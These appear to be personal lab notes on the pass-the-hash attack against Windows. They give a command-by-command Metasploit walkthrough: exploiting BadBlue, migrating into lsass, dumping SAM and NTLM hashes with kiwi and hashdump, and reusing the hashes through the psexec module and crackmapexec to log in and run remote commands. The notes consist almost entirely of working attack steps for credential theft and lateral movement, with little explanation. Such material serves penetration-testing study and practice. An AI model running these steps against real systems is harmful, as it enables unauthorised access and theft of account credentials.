#### Pass-The-Hash Attack
- Pass the hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text
-  passwords and utilizing them to authenticate with the target legitimately.

#### Tools
- metasploit PsExec module
- Crackmapexec
#### Lab environment
- service postgresql start
- msfconsole
- search badblue
- use 1 [badblue_passthru]
- pgrep lsass [ run this command in meterpreter]
- migrate 780 [ 780 is found from previous command]
- getuid 
- load kiwi
- lsa_dump_sam [this is dump all the hashes]
- hashdump [this also dump the hashes but in this case first hash is same for all users and 2nd one is NTLM hash]
- ctrl+z [run the meterpreter session in background]
- search psexec
- use /exploit/windows/smb/psexec 
- set everythings like RHOSTS,LPORT etc
- set SMBUser user_name
- set SMBPass hash1:hash2
- set different LPORT as one meterpreter session is running in one port
- set target
- set target Native\ upload [we can set target as our requirement]
- 
#### crackmapexec
- after getting NTLM hass we can login using this tool
- crackmapexec smb 10.10.10.25 -u Administrator -H "only NTLM hash"
- crackmapexec smb 10.10.10.25 -u Administrator -H "only NTLM hash"  -x "whoami" [ in x parameter value we can use different command as we need]



